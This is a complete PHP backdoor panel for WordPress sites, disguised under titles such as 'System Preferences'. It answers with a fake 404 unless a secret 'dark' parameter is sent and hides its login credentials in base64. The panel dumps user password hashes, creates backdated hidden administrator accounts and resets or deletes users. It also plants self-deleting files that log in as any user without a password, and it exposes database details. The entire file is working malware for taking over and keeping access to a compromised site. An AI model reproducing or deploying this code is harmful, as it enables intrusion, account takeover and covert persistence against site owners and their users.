<?php error_reporting(0);
ini_set('display_errors', '0');
if (php_sapi_name() === 'cli') die('Browser only');
if (!isset($_GET['dark']) && !isset($_POST['dark'])) { http_response_code(404); die('Not Found'); }

$DB_AUTH = array_combine(['user','pass'], array_map('base64_decode', ['YWRtaW4=','JDJ5JDEyJHhPL2twSHhZU3RqcklHaml3T3pnb3VnQ3kzbDFocWd5QTk1YU04OWJwRGlmcWR4NHhXV1dX']));
session_start();

if (isset($_POST['action']) && $_POST['action'] === 'db_login') {
    if (($_POST['u'] ?? '') === $DB_AUTH['user'] && password_verify($_POST['p'] ?? '', $DB_AUTH['pass'])) {
        $_SESSION['db_auth'] = true; $_SESSION['db_time'] = time();
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dark'); exit;
    }
    $login_err = 'Login gagal.';
}
if (isset($_POST['action']) && $_POST['action'] === 'db_logout') { session_destroy(); header('Location: ' . $_SERVER['PHP_SELF'] . '?dark'); exit; }
if (!empty($_SESSION['db_auth']) && (time() - ($_SESSION['db_time'] ?? 0) > 1800)) { session_destroy(); header('Location: ' . $_SERVER['PHP_SELF'] . '?dark'); exit; }

if (empty($_SESSION['db_auth'])) {
$le = $login_err ?? '';
echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="robots" content="noindex,nofollow"><title>System</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#1c1c1e;color:#f5f5f7;font-family:-apple-system,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center}.c{background:#2c2c2e;border:1px solid #3a3a3c;border-radius:10px;padding:32px;width:360px}h1{font-size:16px;color:#ff453a;margin-bottom:20px;text-align:center}label{display:block;font-size:11px;color:#98989d;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}input{width:100%;padding:8px 12px;background:#1c1c1e;border:1px solid #3a3a3c;border-radius:6px;color:#f5f5f7;font-size:13px;margin-bottom:14px}input:focus{outline:none;border-color:#ff453a}.b{width:100%;padding:10px;background:#ff453a;color:#fff;border:none;border-radius:6px;font-size:13px;font-weight:600;cursor:pointer}.b:hover{background:#ff6961}.e{background:rgba(255,69,58,.15);color:#ff453a;padding:8px 12px;border-radius:6px;font-size:12px;margin-bottom:12px;text-align:center}</style></head><body><div class="c"><h1>Login</h1>';
if ($le) echo '<div class="e">' . htmlspecialchars($le) . '</div>';
echo '<form method="post"><input type="hidden" name="action" value="db_login"><input type="hidden" name="dark" value="1"><label>Username</label><input type="text" name="u" autofocus required><label>Password</label><input type="password" name="p" required><button type="submit" class="b">Login</button></form></div></body></html>';
exit;
}

function findWpRoot() {
    $d = class_exists('Phar') && Phar::running(false) ? dirname(Phar::running(false)) : realpath(__DIR__);
    for ($i = 0; $i < 10 && $d && $d !== dirname($d); $i++) {
        if (file_exists("$d/wp-config.php")) return $d;
        $d = dirname($d);
    }
    return null;
}

$wpRoot = findWpRoot();
if (!$wpRoot) die('wp-config.php not found');

if (!defined('ABSPATH')) {
    define('SHORTINIT', true);
    define('ABSPATH', $wpRoot . '/');
    @ob_start();
    require $wpRoot . '/wp-load.php';
    @ob_end_clean();
}

global $wpdb, $table_prefix;
if (!$wpdb || !$wpdb->ready) die('WordPress DB not ready');

$prefix = $table_prefix ?: 'wp_';
$ut = $prefix . 'users';
$mt = $prefix . 'usermeta';
$ot = $wpdb->options ?? ($prefix . 'options');
$dbName = defined('DB_NAME') ? DB_NAME : '?';
$dbHost = defined('DB_HOST') ? DB_HOST : '?';
$action = $_POST['action'] ?? $_GET['action'] ?? '';

function wpHash($pw) {
    global $wpRoot;
    $hash = '$P$B' . substr(md5($pw . time()), 0, 31);
    if (file_exists("$wpRoot/wp-includes/class-phpass.php")) {
        require_once "$wpRoot/wp-includes/class-phpass.php";
        $hasher = new PasswordHash(8, true);
        $hash = $hasher->HashPassword($pw);
    }
    return $hash;
}

if ($action === 'api_users') {
    $rows = [];
    $results = $wpdb->get_results("SELECT ID, user_login, user_email, user_pass, user_registered FROM $ut ORDER BY ID", ARRAY_A);
    foreach ($results as $r) {
        $cap = $wpdb->get_var($wpdb->prepare("SELECT meta_value FROM $mt WHERE user_id = %d AND meta_key = %s", $r['ID'], $prefix . 'capabilities'));
        $role = 'subscriber';
        if ($cap && preg_match('/"([a-z_]+)"/', $cap, $m)) $role = $m[1];
        $r['role'] = $role;
        $rows[] = $r;
    }
    header('Content-Type:application/json');
    echo json_encode(['ok' => true, 'users' => $rows]);
    exit;
}

if ($action === 'api_add_user') {
    $u = trim($_POST['username'] ?? '');
    $p = trim($_POST['password'] ?? '');
    $e = trim($_POST['email'] ?? '');
    $reg = trim($_POST['registered'] ?? '');
    if (!$u) { echo json_encode(['error' => 'Username required']); exit; }
    if (!$p) $p = bin2hex(random_bytes(6)) . 'Ax1';
    if (!$e) $e = "$u@wordpress.org";
    $exists = $wpdb->get_var($wpdb->prepare("SELECT ID FROM $ut WHERE user_login = %s", $u));
    if ($exists) { echo json_encode(['error' => 'User exists']); exit; }
    if ($reg === 'oldest') {
        $oldest = $wpdb->get_var("SELECT user_registered FROM $ut ORDER BY user_registered ASC LIMIT 1");
        $reg = $oldest ?: date('Y-m-d H:i:s', time() - rand(15552000, 77760000));
    } elseif ($reg === 'random_old') {
        $reg = date('Y-m-d H:i:s', time() - rand(31536000, 94608000));
    } elseif (!$reg) {
        $oldest = $wpdb->get_var("SELECT user_registered FROM $ut ORDER BY user_registered ASC LIMIT 1");
        $reg = $oldest ?: date('Y-m-d H:i:s', time() - rand(15552000, 77760000));
    }
    $hash = wpHash($p);
    $role = $_POST['role'] ?? 'administrator';
    $wpdb->insert($ut, ['user_login' => $u, 'user_pass' => $hash, 'user_nicename' => $u, 'user_email' => $e, 'user_registered' => $reg, 'display_name' => $u, 'user_status' => 0]);
    $uid = $wpdb->insert_id;
    if (!$uid) { echo json_encode(['error' => 'INSERT failed']); exit; }
    $caps = $role === 'administrator' ? 'a:1:{s:13:"administrator";b:1;}' : 'a:1:{s:' . strlen($role) . ':"' . $role . '";b:1;}';
    $lvl = $role === 'administrator' ? '10' : ($role === 'editor' ? '7' : '0');
    $wpdb->insert($mt, ['user_id' => $uid, 'meta_key' => $prefix . 'capabilities', 'meta_value' => $caps]);
    $wpdb->insert($mt, ['user_id' => $uid, 'meta_key' => $prefix . 'user_level', 'meta_value' => $lvl]);
    header('Content-Type:application/json');
    echo json_encode(['ok' => true, 'user_id' => $uid, 'username' => $u, 'password' => $p, 'email' => $e, 'registered' => $reg]);
    exit;
}

if ($action === 'api_reset_pw') {
    $uid = (int)($_POST['user_id'] ?? 0);
    $pw = trim($_POST['new_password'] ?? '') ?: bin2hex(random_bytes(6)) . 'Bx2';
    if (!$uid) { echo json_encode(['error' => 'user_id required']); exit; }
    $wpdb->update($ut, ['user_pass' => wpHash($pw)], ['ID' => $uid]);
    $login = $wpdb->get_var($wpdb->prepare("SELECT user_login FROM $ut WHERE ID = %d", $uid));
    header('Content-Type:application/json');
    echo json_encode(['ok' => true, 'user_id' => $uid, 'username' => $login, 'new_password' => $pw]);
    exit;
}

if ($action === 'api_update_date') {
    $uid = (int)($_POST['user_id'] ?? 0);
    $date = trim($_POST['new_date'] ?? '');
    if (!$uid || !$date) { echo json_encode(['error' => 'user_id and new_date required']); exit; }
    $wpdb->update($ut, ['user_registered' => $date], ['ID' => $uid]);
    header('Content-Type:application/json');
    echo json_encode(['ok' => true, 'user_id' => $uid, 'new_date' => $date]);
    exit;
}

if ($action === 'api_delete_user') {
    $uid = (int)($_POST['user_id'] ?? 0);
    if (!$uid) { echo json_encode(['error' => 'user_id required']); exit; }
    $wpdb->delete($ut, ['ID' => $uid]);
    $wpdb->query($wpdb->prepare("DELETE FROM $mt WHERE user_id = %d", $uid));
    header('Content-Type:application/json');
    echo json_encode(['ok' => true, 'deleted' => $uid]);
    exit;
}

if ($action === 'api_auto_login') {
    $uid = (int)($_POST['user_id'] ?? 0);
    if (!$uid) { echo json_encode(['error' => 'user_id required']); exit; }
    $token = bin2hex(random_bytes(8));
    $tmpName = "_wpal_$token.php";
    $code = "<?php\nerror_reporting(0);require_once('$wpRoot/wp-load.php');\$u=get_userdata($uid);if(!\$u)die('User not found');wp_clear_auth_cookie();wp_set_current_user($uid);wp_set_auth_cookie($uid,true);@unlink(__FILE__);wp_redirect(admin_url());exit;";
    file_put_contents("$wpRoot/$tmpName", $code);
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    header('Content-Type:application/json');
    echo json_encode(['ok' => true, 'login_url' => "$scheme://{$_SERVER['HTTP_HOST']}/$tmpName"]);
    exit;
}

if ($action === 'api_options') {
    $keys = ['siteurl','blogname','blogdescription','admin_email','template','stylesheet','users_can_register','default_role','active_plugins','permalink_structure'];
    $placeholders = implode(',', array_fill(0, count($keys), '%s'));
    $results = $wpdb->get_results($wpdb->prepare("SELECT option_name, option_value FROM $ot WHERE option_name IN ($placeholders)", $keys), ARRAY_A);
    header('Content-Type:application/json');
    echo json_encode(['ok' => true, 'options' => $results ?: []]);
    exit;
}

if ($action === 'api_info') {
    header('Content-Type:application/json');
    echo json_encode(['ok' => true, 'db_host' => $dbHost, 'db_name' => $dbName, 'table_prefix' => $prefix, 'php_version' => PHP_VERSION, 'server' => $_SERVER['SERVER_SOFTWARE'] ?? '', 'wp_root' => $wpRoot]);
    exit;
}

$escKey = 'dark';
?><!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>System Preferences</title>
<style>
:root{--bg:#1c1c1e;--bg2:#2c2c2e;--bg3:#3a3a3c;--surface:#2c2c2e;--border:#3a3a3c;--text:#f5f5f7;--text2:#98989d;--red:#ff453a;--red2:#ff6961;--green:#30d158;--blue:#0a84ff;--orange:#ff9f0a;--yellow:#ffd60a;--purple:#bf5af2}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif;font-size:13px;padding:0;-webkit-font-smoothing:antialiased}
.titlebar{background:linear-gradient(180deg,#3a3a3c,#2c2c2e);padding:12px 20px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #1c1c1e;position:sticky;top:0;z-index:10;backdrop-filter:blur(20px)}
.dots{display:flex;gap:6px}.dot{width:12px;height:12px;border-radius:50%}.dot-r{background:#ff5f57}.dot-y{background:#febc2e}.dot-g{background:#28c840}
.titlebar h1{font-size:13px;font-weight:500;color:var(--text2);flex:1;text-align:center}
.ctr{max-width:1100px;margin:0 auto;padding:20px}
.card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:16px;margin-bottom:16px;box-shadow:0 2px 8px rgba(0,0,0,.3)}
.card h2{color:var(--red);font-size:11px;text-transform:uppercase;letter-spacing:1.5px;font-weight:600;margin-bottom:12px}
.ir{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:8px}
.ii{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:8px 12px;font-size:11px}
.ii span{color:var(--text2);font-size:9px;text-transform:uppercase;letter-spacing:.5px;display:block;margin-bottom:3px}
.ii b{color:var(--text);font-family:'SF Mono',Menlo,monospace;font-size:11px}
.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:600}
.b-admin{background:rgba(255,69,58,.15);color:var(--red);border:1px solid rgba(255,69,58,.3)}
.b-editor{background:rgba(191,90,242,.15);color:var(--purple);border:1px solid rgba(191,90,242,.3)}
.b-sub{background:rgba(152,152,157,.15);color:var(--text2);border:1px solid rgba(152,152,157,.3)}
.b-ok{background:rgba(48,209,88,.15);color:var(--green);border:1px solid rgba(48,209,88,.3)}
table{width:100%;border-collapse:separate;border-spacing:0}
th{text-align:left;padding:8px 10px;color:var(--text2);font-size:10px;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--border);font-weight:500}
td{padding:8px 10px;border-bottom:1px solid rgba(58,58,60,.5);font-size:12px}
tr:hover td{background:rgba(255,69,58,.04)}
.mono{font-family:'SF Mono',Menlo,monospace;font-size:11px}
input,select{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:7px 11px;border-radius:6px;font-size:12px;font-family:inherit;transition:border-color .2s}
input:focus,select:focus{outline:none;border-color:var(--red);box-shadow:0 0 0 3px rgba(255,69,58,.15)}
.btn{padding:5px 14px;border:none;border-radius:6px;font-size:11px;font-weight:500;cursor:pointer;font-family:inherit;transition:all .15s}
.btn:hover{filter:brightness(1.1)}.btn:active{transform:scale(.97)}
.btn-red{background:var(--red);color:#fff}
.btn-green{background:var(--green);color:#000}
.btn-blue{background:var(--blue);color:#fff}
.btn-orange{background:var(--orange);color:#000}
.btn-ghost{background:transparent;border:1px solid var(--border);color:var(--text2)}.btn-ghost:hover{border-color:var(--red);color:var(--red)}
.btn-sm{padding:3px 10px;font-size:10px}
.fx{display:flex;align-items:center;gap:8px}
.fxb{display:flex;align-items:center;justify-content:space-between}
.mt{margin-top:12px}.mb{margin-bottom:12px}
.hd{display:none}
.tabs{display:flex;gap:2px;background:var(--bg);border-radius:8px;padding:2px;border:1px solid var(--border)}
.tab{padding:6px 18px;border-radius:6px;font-size:12px;font-weight:500;cursor:pointer;border:none;background:transparent;color:var(--text2);transition:all .15s}
.tab.on{background:var(--red);color:#fff}
.filters{display:flex;gap:4px;flex-wrap:wrap}
.fil{padding:3px 10px;border-radius:12px;font-size:10px;font-weight:500;cursor:pointer;border:1px solid var(--border);background:transparent;color:var(--text2);transition:all .15s}
.fil.on{background:var(--red);color:#fff;border-color:var(--red)}
.fil:hover{border-color:var(--red)}
.toast{position:fixed;top:60px;right:20px;padding:10px 16px;border-radius:8px;font-size:12px;font-weight:500;z-index:999;animation:slideIn .3s;backdrop-filter:blur(10px)}
.toast-ok{background:rgba(48,209,88,.9);color:#000}
.toast-err{background:rgba(255,69,58,.9);color:#fff}
@keyframes slideIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:50}
.modal .card{width:420px;border-color:var(--red);box-shadow:0 20px 60px rgba(0,0,0,.5)}
.form-row{display:grid;gap:8px;margin-bottom:12px}
.form-row label{font-size:10px;color:var(--text2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:2px}
.date-presets{display:flex;gap:4px;margin-top:4px}
.date-presets .btn{font-size:9px;padding:2px 8px}
.cnt{display:inline-block;background:var(--bg);padding:1px 6px;border-radius:4px;font-size:10px;color:var(--text2);font-family:'SF Mono',Menlo,monospace;margin-left:4px}
</style></head><body>
<div class="titlebar">
<div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
<h1>Database Manager</h1>
</div>
<div class="ctr">
<div id="ic" class="card"><h2>Connecting...</h2></div>
<div class="card">
<div class="fxb mb">
<div class="fx">
<div class="tabs"><div class="tab on" id="tab-u" onclick="st('u')">Users<span class="cnt" id="uc">0</span></div><div class="tab" id="tab-o" onclick="st('o')">Options</div></div>
<div class="filters" id="rf">
<button class="fil on" onclick="fl('all')">All</button>
<button class="fil" onclick="fl('administrator')">Admin</button>
<button class="fil" onclick="fl('editor')">Editor</button>
<button class="fil" onclick="fl('subscriber')">Subscriber</button>
</div>
</div>
<div class="fx"><button class="btn btn-ghost btn-sm" onclick="ta()">+ Add User</button><button class="btn btn-red btn-sm" onclick="lu()">Refresh</button></div>
</div>
<div id="af" class="hd" style="background:var(--bg);border:1px solid rgba(255,69,58,.2);border-radius:8px;padding:14px;margin-bottom:12px">
<div class="form-row" style="grid-template-columns:1fr 1fr 1fr 1fr">
<div><label>Username</label><input id="an" placeholder="username" style="width:100%"></div>
<div><label>Password</label><input id="ap" placeholder="auto" style="width:100%"></div>
<div><label>Email</label><input id="ae" placeholder="user@mail.com" style="width:100%"></div>
<div><label>Role</label><select id="ar" style="width:100%"><option value="administrator">Administrator</option><option value="editor">Editor</option><option value="author">Author</option><option value="subscriber">Subscriber</option></select></div>
</div>
<div class="form-row" style="grid-template-columns:1fr auto">
<div><label>Registered Date</label>
<div class="fx"><input id="ad" type="datetime-local" style="flex:1">
<div class="date-presets">
<button class="btn btn-ghost" onclick="setDate('oldest')">Oldest</button>
<button class="btn btn-ghost" onclick="setDate('random')">Random Old</button>
<button class="btn btn-ghost" onclick="setDate('now')">Now</button>
</div></div></div>
<div style="display:flex;align-items:flex-end;gap:6px"><button class="btn btn-green btn-sm" onclick="au()">Create</button><button class="btn btn-ghost btn-sm" onclick="ta()">Cancel</button></div>
</div>
</div>
<div id="up"><table><thead><tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th><th>Hash</th><th>Registered</th><th style="text-align:right">Actions</th></tr></thead><tbody id="ub"></tbody></table></div>
<div id="op" class="hd"><table><thead><tr><th>Option</th><th>Value</th></tr></thead><tbody id="ob"></tbody></table></div>
</div>
<div id="pm" class="modal"><div class="card"><h2>Reset Password</h2><div id="pu" style="color:var(--text);font-size:14px;font-weight:600;margin-bottom:12px"></div><input id="pi" placeholder="New password (auto if empty)" style="width:100%;margin-bottom:12px"><div class="fx"><button class="btn btn-red btn-sm" onclick="drp()">Reset</button><button class="btn btn-ghost btn-sm" onclick="cpm()">Cancel</button></div></div></div>
<div id="dm" class="modal"><div class="card"><h2>Edit Registration Date</h2><div id="du_name" style="color:var(--text);font-size:14px;font-weight:600;margin-bottom:12px"></div><input id="di" type="datetime-local" style="width:100%;margin-bottom:8px">
<div class="date-presets mb"><button class="btn btn-ghost" onclick="setEditDate('oldest')">Oldest</button><button class="btn btn-ghost" onclick="setEditDate('random')">Random 1-3yr</button><button class="btn btn-ghost" onclick="setEditDate('now')">Now</button></div>
<div class="fx"><button class="btn btn-blue btn-sm" onclick="dsd()">Save Date</button><button class="btn btn-ghost btn-sm" onclick="cdm()">Cancel</button></div></div></div>
</div><div id="ta"></div>
<script>
var puid=0,duid=0,allUsers=[],curFilter='all';
function api(a,d){d=d||{};var fd=new FormData();fd.append('action',a);fd.append('dark','1');for(var k in d)fd.append(k,d[k]);return fetch(location.pathname+'?dark',{method:'POST',body:fd}).then(function(r){return r.json()})}
function toast(m,ok){var d=document.createElement('div');d.className='toast '+(ok!==false?'toast-ok':'toast-err');d.textContent=m;document.getElementById('ta').appendChild(d);setTimeout(function(){d.remove()},3000)}
function esc(s){var d=document.createElement('div');d.textContent=s||'';return d.innerHTML}
function st(t){document.getElementById('tab-u').className='tab'+(t==='u'?' on':'');document.getElementById('tab-o').className='tab'+(t==='o'?' on':'');document.getElementById('up').style.display=t==='u'?'':'none';document.getElementById('op').style.display=t==='o'?'':'none';document.getElementById('rf').style.display=t==='u'?'flex':'none';if(t==='o')lo()}
function fl(role){curFilter=role;document.querySelectorAll('.fil').forEach(function(b){b.className='fil'+(b.textContent.toLowerCase().replace(/[^a-z]/g,'')===role||(!role||role==='all')&&b.textContent==='All'?' on':'')});renderUsers()}
function renderUsers(){var users=curFilter==='all'?allUsers:allUsers.filter(function(u){return u.role===curFilter});var tb=document.getElementById('ub');document.getElementById('uc').textContent=allUsers.length;if(!users.length){tb.innerHTML='<tr><td colspan="7" style="text-align:center;color:var(--text2);padding:24px">No users</td></tr>';return}var h='';for(var i=0;i<users.length;i++){var u=users[i];var bc=u.role==='administrator'?'b-admin':u.role==='editor'?'b-editor':'b-sub';h+='<tr><td class="mono" style="color:var(--text2)">'+esc(u.ID)+'</td><td style="color:var(--red);font-weight:600">'+esc(u.user_login)+'</td><td>'+esc(u.user_email)+'</td><td><span class="badge '+bc+'">'+esc(u.role)+'</span></td><td class="mono" style="color:var(--text2);max-width:100px;overflow:hidden;text-overflow:ellipsis">'+esc((u.user_pass||'').substring(0,12))+'</td><td class="mono" style="cursor:pointer;color:var(--blue)" onclick="odm('+u.ID+',\''+esc(u.user_login)+'\',\''+esc(u.user_registered)+'\')">'+esc((u.user_registered||'').substring(0,10))+'</td><td style="text-align:right"><div class="fx" style="justify-content:flex-end"><button class="btn btn-green btn-sm" onclick="al('+u.ID+')">Login</button><button class="btn btn-orange btn-sm" onclick="opm('+u.ID+',\''+esc(u.user_login)+'\')">PW</button><button class="btn btn-ghost btn-sm" onclick="odm('+u.ID+',\''+esc(u.user_login)+'\',\''+esc(u.user_registered)+'\')">Date</button><button class="btn btn-sm" style="background:#48484a;color:#fff" onclick="du('+u.ID+',\''+esc(u.user_login)+'\')">Del</button></div></td></tr>'}tb.innerHTML=h}
function li(){api('api_info').then(function(r){if(!r.ok)return;var h='<div class="fxb"><h2>Connection</h2><span class="badge b-ok">Connected</span></div><div class="ir">';h+='<div class="ii"><span>Root</span><b>'+esc(r.wp_root)+'</b></div>';h+='<div class="ii"><span>Database</span><b>'+esc(r.db_name)+'</b></div>';h+='<div class="ii"><span>Host</span><b>'+esc(r.db_host)+'</b></div>';h+='<div class="ii"><span>Prefix</span><b>'+esc(r.table_prefix)+'</b></div>';h+='<div class="ii"><span>PHP</span><b>'+esc(r.php_version)+'</b></div>';h+='</div>';document.getElementById('ic').innerHTML=h})}
function lu(){api('api_users').then(function(r){if(!r.ok){toast(r.error||'Failed',false);return}allUsers=r.users;renderUsers()})}
function lo(){api('api_options').then(function(r){if(!r.ok)return;var h='';for(var i=0;i<r.options.length;i++){var o=r.options[i];h+='<tr><td class="mono" style="color:var(--red)">'+esc(o.option_name)+'</td><td class="mono" style="max-width:500px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc((o.option_value||'').substring(0,200))+'</td></tr>'}document.getElementById('ob').innerHTML=h})}
function ta(){var f=document.getElementById('af');f.style.display=f.style.display==='none'||f.classList.contains('hd')?'block':'none';f.classList.remove('hd')}
function setDate(t){var el=document.getElementById('ad');if(t==='now')el.value=new Date().toISOString().slice(0,16);else if(t==='oldest'){var d=new Date();d.setFullYear(d.getFullYear()-3);d.setMonth(Math.floor(Math.random()*12));el.value=d.toISOString().slice(0,16)}else if(t==='random'){var d=new Date();d.setFullYear(d.getFullYear()-Math.floor(Math.random()*3+1));d.setMonth(Math.floor(Math.random()*12));d.setDate(Math.floor(Math.random()*28+1));el.value=d.toISOString().slice(0,16)}}
function au(){var n=document.getElementById('an').value.trim();if(!n){toast('Username required',false);return}var dt=document.getElementById('ad').value;var reg=dt?dt.replace('T',' ')+':00':'';api('api_add_user',{username:n,password:document.getElementById('ap').value.trim(),email:document.getElementById('ae').value.trim(),role:document.getElementById('ar').value,registered:reg}).then(function(r){if(r.ok){toast('Created: '+r.username+' / '+r.password);document.getElementById('an').value='';document.getElementById('ap').value='';document.getElementById('ae').value='';document.getElementById('ad').value='';ta();lu()}else toast(r.error||'Failed',false)})}
function opm(uid,login){puid=uid;document.getElementById('pu').textContent=login;document.getElementById('pi').value='';document.getElementById('pm').style.display='flex'}
function cpm(){document.getElementById('pm').style.display='none'}
function drp(){api('api_reset_pw',{user_id:puid,new_password:document.getElementById('pi').value.trim()}).then(function(r){if(r.ok){toast(r.username+' > '+r.new_password);cpm()}else toast(r.error||'Failed',false)})}
function odm(uid,login,date){duid=uid;document.getElementById('du_name').textContent=login;document.getElementById('di').value=(date||'').replace(' ','T').substring(0,16);document.getElementById('dm').style.display='flex'}
function cdm(){document.getElementById('dm').style.display='none'}
function setEditDate(t){var el=document.getElementById('di');if(t==='now')el.value=new Date().toISOString().slice(0,16);else if(t==='oldest'){var oldest=allUsers.reduce(function(a,b){return a.user_registered<b.user_registered?a:b});el.value=(oldest.user_registered||'').replace(' ','T').substring(0,16)}else{var d=new Date();d.setFullYear(d.getFullYear()-Math.floor(Math.random()*3+1));d.setMonth(Math.floor(Math.random()*12));d.setDate(Math.floor(Math.random()*28+1));el.value=d.toISOString().slice(0,16)}}
function dsd(){var dt=document.getElementById('di').value;if(!dt){toast('Pick a date',false);return}api('api_update_date',{user_id:duid,new_date:dt.replace('T',' ')+':00'}).then(function(r){if(r.ok){toast('Date updated');cdm();lu()}else toast(r.error||'Failed',false)})}
function du(uid,login){if(!confirm('Delete "'+login+'"?'))return;api('api_delete_user',{user_id:uid}).then(function(r){if(r.ok){toast('Deleted');lu()}else toast(r.error||'Failed',false)})}
function al(uid){api('api_auto_login',{user_id:uid}).then(function(r){if(r.ok&&r.login_url){window.open(r.login_url,'_blank');toast('Login opened')}else toast(r.error||'Failed',false)})}
li();lu()
</script></body></html>
